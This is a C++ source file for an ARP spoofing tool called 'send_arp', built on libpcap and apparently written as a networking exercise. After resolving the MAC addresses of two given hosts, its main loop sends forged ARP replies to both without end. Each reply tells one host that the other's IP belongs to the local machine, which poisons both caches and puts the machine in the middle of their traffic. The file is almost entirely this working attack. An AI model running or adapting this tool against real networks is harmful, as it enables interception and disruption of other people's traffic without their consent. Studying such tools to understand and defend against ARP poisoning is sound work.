#include <pcap.h>
#include <cstring>
#include <cstdio>
#include <iostream>
#include "Packet.h"
#include "EthPacket.h"
#include "ArpPacket.h"
#include "IpPacket.h"
#include "TcpPacket.h"
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <unistd.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include "Utils.h"
#include <boost/format.hpp>

void printHelp(const char* argv0)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    std::cout << "send_arp" << std::endl;
    std::cout << "Usage: " << argv0 << " <interface> <sender ip> <target ip>" << std::endl;
    std::cout << "Available Devices" << std::endl;
    pcap_if_t* alldevsp;
    pcap_findalldevs(&alldevsp, errbuf);
    if(alldevsp != NULL) {
      for(pcap_if_t* curdevp = alldevsp; curdevp->next != NULL; curdevp = curdevp->next)
        std::cout << "  " << curdevp->name << std::endl;
    }
    std::exit(EXIT_FAILURE);
}

int main(int argc, char** argv) {
    char errbuf[PCAP_ERRBUF_SIZE];
    if(argc < 4) {
         printHelp(argv[0]);
         return EXIT_FAILURE;
    }

    auto iface = argv[1];

    uint8_t senderIp[4];
    Utils::fromIpString(argv[2], senderIp);
    uint8_t targetIp[4];
    Utils::fromIpString(argv[3], targetIp);

    uint8_t myMac[6];
    Utils::getMyMac(iface, myMac);
    uint8_t myIp[4];
    Utils::getMyIp(iface, myIp);

    for(int i = 0; i < 6; ++i)
    {
      std::printf("%02x:", (unsigned char)myMac[i]);
    }
    std::printf("\n");
    //printf("%s\n", inet_ntoa(myIp));

    std::cout << "sender: " << argv[2] << std::endl;
    std::cout << "target: " << argv[3] << std::endl;


    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL)
    {
        std::cout << errbuf << std::endl;
        return -1;
    }
    uint8_t senderMac[6];
    uint8_t targetMac[6];

    Utils::queryMac(handle, myMac, myIp, senderIp, senderMac);
    Utils::queryMac(handle, myMac, myIp, targetIp, targetMac);
    
    while(true) {
        ArpPacket::reply(
            handle,
            myMac,
            senderIp,
            targetMac,
            targetIp 
        );
        ArpPacket::reply(
            handle,
            myMac,
            targetIp,
            senderMac,
            senderIp
        );
    }
    pcap_close(handle);
}
